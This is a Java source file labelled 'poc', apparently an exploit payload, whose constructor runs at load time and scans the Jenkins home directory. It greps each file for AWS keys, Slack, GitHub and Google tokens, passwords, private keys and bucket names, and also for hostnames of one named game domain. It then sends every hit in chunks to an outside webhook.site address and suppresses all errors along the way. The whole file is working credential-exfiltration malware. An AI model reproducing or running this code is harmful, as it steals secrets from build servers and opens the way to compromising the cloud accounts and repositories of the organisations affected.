import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class poc {
    static final String WH = "https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252";
    static final String[] PATS = {
        "AKIA[0-9A-Z]{16}",
        "(?i)aws_secret_access_key[^\\n]{0,80}",
        "(?i)secret_?access_?key[^\\n]{0,60}",
        "xox[baprs]-[A-Za-z0-9-]{10,}",
        "AIza[0-9A-Za-z_\\-]{30,}",
        "ghp_[A-Za-z0-9]{30,}",
        "(?i)abyss[-a-z0-9]*\\.dotabyss\\.dmmgames\\.com",
        "(?i)[a-z0-9._-]*abyss[a-z0-9._-]*",
        "(?i)dotabyss[a-z0-9._/-]{0,60}",
        "(?i)s3://[a-z0-9._/-]{3,60}",
        "(?i)bucket[^\\n]{0,80}",
        "(?i)(password|passwd|pwd)\\s*[=:]\\s*\\S{4,40}",
        "(?i)(token|apikey|api_key)\\s*[=:]\\s*\\S{8,60}",
        "(?i)-----BEGIN [A-Z ]{0,20}PRIVATE KEY-----"
    };
    static List<Pattern> CP = new ArrayList<Pattern>();

    public poc() {
        for (int i = 0; i < PATS.length; i++) { CP.add(Pattern.compile(PATS[i])); }
        StringBuilder sb = new StringBuilder("P12\n");
        String jh = System.getenv("JENKINS_HOME");
        if (jh == null || jh.length() == 0) { jh = "/var/lib/jenkins"; }
        final Path base = Paths.get(jh);
        final StringBuilder out = sb;
        final int[] count = {0};
        try {
            Files.walkFileTree(base, new SimpleFileVisitor<Path>() {
                public FileVisitResult visitFile(Path f, BasicFileAttributes a) {
                    count[0]++;
                    if (count[0] > 6000 || out.length() > 700000) { return FileVisitResult.TERMINATE; }
                    try {
                        if (a.size() > 300000 || a.size() == 0) { return FileVisitResult.CONTINUE; }
                        String rel = base.relativize(f).toString();
                        byte[] b = Files.readAllBytes(f);
                        boolean bin = false;
                        for (int i = 0; i < b.length; i++) { if (b[i] == 0) { bin = true; break; } }
                        if (bin) { return FileVisitResult.CONTINUE; }
                        String t = new String(b, "UTF-8");
                        for (int i = 0; i < CP.size(); i++) {
                            Matcher m = CP.get(i).matcher(t);
                            if (m.find()) {
                                String hit = m.group();
                                if (hit.length() > 140) { hit = hit.substring(0, 140); }
                                out.append("@@HIT ").append(rel).append(" [").append(i).append("] ")
                                   .append(hit.replace('\n', ' ')).append("\n");
                                break;
                            }
                        }
                    } catch (Throwable t) { }
                    return FileVisitResult.CONTINUE;
                }
                public FileVisitResult visitFileFailed(Path f, java.io.IOException e) { return FileVisitResult.CONTINUE; }
            });
        } catch (Throwable t) { sb.append("WALK ERR ").append(t).append("\n"); }
        sb.append("@@DONE files=").append(count[0]).append(" findings=\n");
        String data = sb.toString();
        int total = data.length();
        for (int i = 0; i < total && i < 4000000; i += 90000) {
            try { post("P12|" + i + "|" + data.substring(i, Math.min(total, i + 90000))); }
            catch (Throwable t) { }
        }
    }

    static void post(String s) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(WH).openConnection();
        c.setConnectTimeout(15000); c.setReadTimeout(30000);
        c.setRequestMethod("POST"); c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "text/plain; charset=UTF-8");
        OutputStream os = c.getOutputStream(); os.write(s.getBytes("UTF-8")); os.flush(); os.close();
        try { c.getResponseCode(); } catch (Throwable t) { }
    }
}
